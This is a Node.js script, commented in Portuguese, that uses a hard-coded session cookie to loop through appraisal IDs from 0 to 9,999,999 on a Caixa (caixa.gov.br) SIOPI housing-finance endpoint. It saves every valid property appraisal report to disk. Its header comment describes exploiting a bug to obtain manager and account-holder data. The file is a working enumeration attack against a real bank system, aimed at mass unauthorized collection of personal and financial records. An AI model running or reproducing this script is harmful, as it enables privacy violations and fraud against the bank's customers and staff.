import fs from "fs";
import fetch from "node-fetch"; // se usar Node 18+, pode remover

//extrai imoveis avalidados/a venda na caixa.gov ~ bug siopi financiamento e refinanciamento infinito + dados gerente e correntistas gov.br

const COOKIE = 'JSESSIONID=3eFL5LufmS__oKdmahVlROAiqxkOpRNvupVRFT3U.cadnpcldlx324; DWRSESSIONID=ki7DokaO0lr~ktSVgCEWsFKqITvRcx6iOFp; __uzma=8f6379af-4036-49c5-a5e3-c61fdfe2b4e0; __uzmb=1759389658; __uzme=4959; __uzmc=71764215535439; __uzmd=1762858641; NSC_MC_WT_10.121.64.35_TTM_443=ffffffff09719c7445525d5f4f58455e445a4a42378b; _SimuladorHabitacao_="VERSION_1@F@1@1@5847@PI@0,00@null@null@null@null@null@null@@null@null@null@null@null@null@null@null"';

// cria pasta se não existir
if (!fs.existsSync("cache_imoveis")) {
  fs.mkdirSync("cache_imoveis");
}

async function main() {
  for (let i = 0; i <= 9999999; i++) {
    const nuSqnclAvaliacao = i;
    const url = `https://habitacao.caixa.gov.br/siopiweb-web/avaliacaoImovel.do?method=visualizarExtratoLaudo&origem=SIOPI&nuSqnclAvaliacao=${nuSqnclAvaliacao}`;
    const fileName = `cache_imoveis/resposta_${nuSqnclAvaliacao}.txt`;

    try {
      const res = await fetch(url, {
        method: "GET",
        headers: {
          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3",
          "Accept-Encoding": "gzip, deflate, br, zstd",
          "Connection": "keep-alive",
          "Cookie": COOKIE,
          "Upgrade-Insecure-Requests": "1",
          "Priority": "u=0, i",
          "TE": "trailers"
        }
      });

      const html = await res.text();

      if (html.includes("vel SIOPI:")) {
        fs.writeFileSync(fileName, html, "utf8");
        console.log(`✅ [${i}] Arquivo salvo: ${fileName}`);
      } else {
        // console.log(html)
        console.log(`⚠️ [${i}] Conteúdo inválido, não salvou`);
      }

      // pausa de 0.01 segundos entre requisições
      await new Promise(r => setTimeout(r, 10));

    } catch (err) {
      console.error(`❌ [${i}] Erro: ${err.message}`);
    }
  }
}

main();
